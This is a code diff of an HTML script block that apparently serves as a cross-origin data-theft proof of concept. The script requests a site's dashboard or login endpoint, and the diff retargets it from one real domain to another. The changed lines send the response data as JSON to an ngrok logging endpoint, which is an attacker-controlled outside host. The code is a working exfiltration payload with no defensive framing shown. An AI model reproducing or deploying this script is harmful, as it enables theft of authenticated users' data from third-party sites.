@@ -2,7 +2,7 @@
 
 <script>
     // Define the target URL
-    var targetUrl = 'https://teemill.com/omnis/v3/dashboard/secure/get/';
+    var targetUrl = 'https://podos.io/omnis/v3/dashboard/user/login';
 
     // Create a new XMLHttpRequest
     var req = new XMLHttpRequest();
@@ -19,7 +19,7 @@
 
         // Send the actual response data to your logging endpoint as JSON
         var logReq = new XMLHttpRequest();
-        logReq.open('POST', 'https://b9b3-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app/log', true);
+        logReq.open('POST', 'https://eba3-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app/log', true);
         logReq.setRequestHeader('Content-Type', 'application/json');
 
         // Send the data as JSON
